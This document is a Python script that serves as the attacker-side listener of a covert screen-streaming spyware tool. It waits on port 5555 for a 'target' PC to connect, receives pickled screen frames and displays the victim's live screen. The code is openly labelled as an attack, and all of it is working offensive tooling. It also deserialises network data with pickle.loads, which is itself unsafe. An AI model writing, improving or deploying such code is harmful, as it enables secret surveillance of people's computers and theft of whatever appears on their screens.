import socket
import cv2
import pickle
import struct


ATTACKER_IP = "0.0.0.0"
PORT = 5555

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((ATTACKER_IP, PORT))
server.listen(1)
print("[*] Screen Streamer Listener started. Waiting for target...")

target_socket, address = server.accept()
print(f"[+] Connected to target: {address}")

data = b""
payload_size = struct.calcsize("Q") 

try:
    while True:
       
        while len(data) < payload_size:
            packet = target_socket.recv(4 * 1024)
            if not packet: break
            data += packet
            
        if not data: break
        
        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack("Q", packed_msg_size)[0]
        
        
        while len(data) < msg_size:
            data += target_socket.recv(4 * 1024)
            
        frame_data = data[:msg_size]
        data = data[msg_size:]
        
        
        frame = pickle.loads(frame_data)
        
        
        cv2.imshow("Target PC - Live Screen Stream", frame)
        
       
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break
finally:
    cv2.destroyAllWindows()
    target_socket.close()
    server.close()
